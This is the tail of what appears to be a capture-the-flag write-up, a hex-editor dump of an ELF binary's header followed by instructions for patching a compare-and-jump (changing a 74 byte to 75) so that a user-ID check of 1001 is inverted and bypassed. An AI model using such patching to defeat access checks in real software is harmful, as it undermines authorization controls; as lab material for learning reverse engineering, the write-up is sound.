│000000E1 00 20 00 00 00 00 00 01 00 00 00 06 00 00 00 10 1E 00 00 00 00 00 00 10 1E 60 00 00 00 00 00 10 1E 60 00 00 00 00 00 A8 02 00 00 00 00 │▒│. .......................`.......`...........│
│0000010E 00 00 B0 02 00 00 00 00 00 00 00 00 20 00 00 00 00 00 02 00 00 00 06 00 00 00 28 1E 00 00 00 00 00 00 28 1E 60 00 00 00 00 00 28 1E 60 │▒│............ .............(.......(.`.....(.`│
│0000013B 00 00 00 00 00 D0 01 00 00 00 00 00 00 D0 01 00 00 00 00 00 00 08 00 00 00 00 00 00 00 04 00 00 00 04 00 00 00 54 02 00 00 00 00 00 00 │▒│.....................................T.......│
│00000168 54 02 40 00 00 00 00 00 54 02 40 00 00 00 00 00 44 00 00 00 00 00 00 00 44 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 50 E5 74 64 04 │▒│T.@.....T.@.....D.......D...............P.td.│
│00000195 00 00 00 44 0D 00 00 00 00 00 00 44 0D 40 00 00 00 00 00 44 0D 40 00 00 00 00 00 44 00 00 00 00 00 00 00 44 00 00 00 00 00 00 00 04 00 │▒│...D.......D.@.....D.@.....D.......D.........│

```

Use `ctrl+f` to find “3de90300007414”, which is the instructions for that compare and then the jump. Looking at [x86 jumps](http://unixwiz.net/techtips/x86-jumps.html), I just need to change the 74 to a 75. Then `ctrl-q`, tell it to save, and exit. Now I can run it with any user that isn’t 1001 and get past that check.

[Smasher BOF in tiny »](/2018/11/24/htb-smasher-bof.html)